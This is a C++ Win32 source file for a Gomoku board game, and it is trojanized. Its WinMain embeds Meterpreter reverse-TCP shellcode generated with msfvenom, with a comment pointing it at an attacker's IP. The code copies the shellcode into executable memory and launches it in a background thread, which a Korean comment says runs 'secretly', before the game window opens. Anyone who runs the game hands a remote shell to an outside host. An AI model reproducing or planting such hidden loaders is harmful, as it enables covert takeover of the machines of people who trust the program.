#include <windows.h>
#include <string.h>
#include <initializer_list>

// ─── 상수 ────────────────────────────────────────────────────────────────────
static constexpr int BOARD_SIZE = 15;
static constexpr int CELL       = 40;
static constexpr int MARGIN     = 50;
static constexpr int STONE_R    = 17;
static constexpr int SCR_W      = CELL * (BOARD_SIZE - 1) + MARGIN * 2;
static constexpr int SCR_H      = CELL * (BOARD_SIZE - 1) + MARGIN * 2 + 70;

// ─── 열거형 ──────────────────────────────────────────────────────────────────
enum CellVal { EMPTY = 0, BLACK_S, WHITE_S };
enum State   { PLAYING, BLACK_WIN, WHITE_WIN };

// ─── 보드 ────────────────────────────────────────────────────────────────────
struct Board {
    CellVal grid[BOARD_SIZE][BOARD_SIZE]{};
    void reset() { for (auto& r : grid) for (auto& c : r) c = EMPTY; }
    bool inBounds(int x, int y) const {
        return x >= 0 && x < BOARD_SIZE && y >= 0 && y < BOARD_SIZE;
    }
    int span(int x, int y, int dx, int dy, CellVal p) const {
        int n = 0;
        for (int nx=x+dx, ny=y+dy; inBounds(nx,ny)&&grid[ny][nx]==p; nx+=dx,ny+=dy) ++n;
        return n;
    }
    bool checkWin(int x, int y, CellVal p) const {
        constexpr int D[4][2] = {{1,0},{0,1},{1,1},{1,-1}};
        for (auto& d : D)
            if (1 + span(x,y,d[0],d[1],p) + span(x,y,-d[0],-d[1],p) >= 5)
                return true;
        return false;
    }
    bool place(int x, int y, CellVal p) {
        if (!inBounds(x,y) || grid[y][x] != EMPTY) return false;
        grid[y][x] = p; return true;
    }
};

// ─── 전역 상태 ───────────────────────────────────────────────────────────────
static Board   g_board;
static CellVal g_turn  = BLACK_S;
static State   g_state = PLAYING;
static int     g_lastX = -1, g_lastY = -1;

static RECT g_btn = { SCR_W/2-55, SCR_H-46, SCR_W/2+55, SCR_H-16 };

static inline int toScreen(int c) { return MARGIN + c * CELL; }
static inline int toCell(int s)   { return (s - MARGIN + CELL/2) / CELL; }

// ─── 렌더링 ──────────────────────────────────────────────────────────────────
static void DrawBoard(HDC hdc) {
    // 배경
    HBRUSH bgBrush = CreateSolidBrush(RGB(218,174,84));
    RECT full = {0,0,SCR_W,SCR_H};
    FillRect(hdc, &full, bgBrush);
    DeleteObject(bgBrush);

    // 격자선
    HPEN linePen = CreatePen(PS_SOLID, 1, RGB(140,90,20));
    HPEN oldPen  = (HPEN)SelectObject(hdc, linePen);
    for (int i = 0; i < BOARD_SIZE; i++) {
        MoveToEx(hdc, toScreen(0),            toScreen(i), nullptr);
        LineTo  (hdc, toScreen(BOARD_SIZE-1), toScreen(i));
        MoveToEx(hdc, toScreen(i), toScreen(0),            nullptr);
        LineTo  (hdc, toScreen(i), toScreen(BOARD_SIZE-1));
    }
    SelectObject(hdc, oldPen);
    DeleteObject(linePen);

    // 화점
    HPEN   nullPen  = (HPEN)GetStockObject(NULL_PEN);
    HBRUSH starBrush = CreateSolidBrush(RGB(100,55,10));
    SelectObject(hdc, nullPen);
    SelectObject(hdc, starBrush);
    for (int p : {3,7,11}) for (int q : {3,7,11}) {
        int sx = toScreen(p), sy = toScreen(q);
        Ellipse(hdc, sx-4, sy-4, sx+5, sy+5);
    }
    DeleteObject(starBrush);

    // 돌
    for (int y = 0; y < BOARD_SIZE; y++) {
        for (int x = 0; x < BOARD_SIZE; x++) {
            CellVal c = g_board.grid[y][x];
            if (c == EMPTY) continue;
            int sx = toScreen(x), sy = toScreen(y);

            HBRUSH sb; HPEN sp;
            if (c == BLACK_S) {
                sb = CreateSolidBrush(RGB(20,20,20));
                sp = CreatePen(PS_SOLID, 1, RGB(70,70,70));
            } else {
                sb = CreateSolidBrush(RGB(245,245,245));
                sp = CreatePen(PS_SOLID, 1, RGB(160,160,160));
            }
            HPEN   op = (HPEN)  SelectObject(hdc, sp);
            HBRUSH ob = (HBRUSH)SelectObject(hdc, sb);
            Ellipse(hdc, sx-STONE_R, sy-STONE_R, sx+STONE_R, sy+STONE_R);
            SelectObject(hdc, op); SelectObject(hdc, ob);
            DeleteObject(sb); DeleteObject(sp);

            // 마지막 수 표시
            if (x == g_lastX && y == g_lastY) {
                HBRUSH rb = CreateSolidBrush(RGB(220,50,50));
                SelectObject(hdc, GetStockObject(NULL_PEN));
                SelectObject(hdc, rb);
                Ellipse(hdc, sx-5, sy-5, sx+5, sy+5);
                DeleteObject(rb);
            }
        }
    }

    // 상태 텍스트
    const char* msg;
    COLORREF tc;
    if (g_state == PLAYING) {
        msg = (g_turn == BLACK_S) ? "Black's Turn" : "White's Turn";
        tc  = (g_turn == BLACK_S) ? RGB(20,20,20) : RGB(90,90,90);
    } else {
        msg = (g_state == BLACK_WIN) ? "Black Wins!" : "White Wins!";
        tc  = RGB(180,0,0);
    }
    HFONT font = CreateFontA(22,0,0,0,FW_BOLD,FALSE,FALSE,FALSE,
                             DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,
                             DEFAULT_QUALITY,DEFAULT_PITCH,"Arial");
    HFONT oldFont = (HFONT)SelectObject(hdc, font);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, tc);
    SIZE sz;
    GetTextExtentPoint32A(hdc, msg, (int)strlen(msg), &sz);
    TextOutA(hdc, SCR_W/2 - sz.cx/2, 14, msg, (int)strlen(msg));

    // 재시작 버튼
    HBRUSH btnBrush = CreateSolidBrush(RGB(230,230,230));
    HPEN   btnPen   = CreatePen(PS_SOLID, 1, RGB(110,110,110));
    HPEN   op2 = (HPEN)  SelectObject(hdc, btnPen);
    HBRUSH ob2 = (HBRUSH)SelectObject(hdc, btnBrush);
    RoundRect(hdc, g_btn.left, g_btn.top, g_btn.right, g_btn.bottom, 6, 6);
    SelectObject(hdc, op2); SelectObject(hdc, ob2);
    DeleteObject(btnBrush); DeleteObject(btnPen);

    const char* bt = "Restart";
    SetTextColor(hdc, RGB(60,60,60));
    GetTextExtentPoint32A(hdc, bt, (int)strlen(bt), &sz);
    TextOutA(hdc,
             (g_btn.left + g_btn.right)/2  - sz.cx/2,
             (g_btn.top  + g_btn.bottom)/2 - sz.cy/2,
             bt, (int)strlen(bt));

    SelectObject(hdc, oldFont);
    DeleteObject(font);
}

// ─── 윈도우 프로시저 ─────────────────────────────────────────────────────────
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        // 더블 버퍼링
        HDC     memDC  = CreateCompatibleDC(hdc);
        HBITMAP memBmp = CreateCompatibleBitmap(hdc, SCR_W, SCR_H);
        HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, memBmp);
        DrawBoard(memDC);
        BitBlt(hdc, 0, 0, SCR_W, SCR_H, memDC, 0, 0, SRCCOPY);
        SelectObject(memDC, oldBmp);
        DeleteObject(memBmp);
        DeleteDC(memDC);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_LBUTTONDOWN: {
        POINT pt = { (LONG)LOWORD(lp), (LONG)HIWORD(lp) };
        if (PtInRect(&g_btn, pt)) {
            g_board.reset();
            g_turn = BLACK_S; g_state = PLAYING; g_lastX = g_lastY = -1;
            InvalidateRect(hwnd, nullptr, FALSE);
            return 0;
        }
        if (g_state == PLAYING) {
            int cx = toCell(pt.x), cy = toCell(pt.y);
            if (g_board.place(cx, cy, g_turn)) {
                g_lastX = cx; g_lastY = cy;
                if (g_board.checkWin(cx, cy, g_turn))
                    g_state = (g_turn == BLACK_S) ? BLACK_WIN : WHITE_WIN;
                else
                    g_turn = (g_turn == BLACK_S) ? WHITE_S : BLACK_S;
                InvalidateRect(hwnd, nullptr, FALSE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

// ─── WinMain ─────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nCmdShow) {

    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=<공격자ip> -f c
    // 페이로드
    unsigned char shellcode[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7"
"\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01"
"\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50"
"\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
"\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
"\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
"\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
"\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
"\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
"\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\x19\xf3\x6c\x68\x02\x00"
"\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74"
"\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53"
"\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
"\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e"
"\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a"
"\x00\x53\xff\xd5";

    // 쉘코드를 메모리에 올리고 백그라운드에서 몰래 실행
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);

    g_board.reset();

    WNDCLASSA wc  = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = "GomokuWnd";
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    RegisterClassA(&wc);

    // 클라이언트 영역이 정확히 SCR_W × SCR_H 가 되도록 조정
    RECT wr = {0, 0, SCR_W, SCR_H};
    DWORD style = WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX;
    AdjustWindowRect(&wr, style, FALSE);

    HWND hwnd = CreateWindowA(
        "GomokuWnd", "Gomoku",
        style,
        CW_USEDEFAULT, CW_USEDEFAULT,
        wr.right - wr.left, wr.bottom - wr.top,
        nullptr, nullptr, hInst, nullptr
    );

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG message;
    while (GetMessage(&message, nullptr, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    return (int)message.wParam;
}
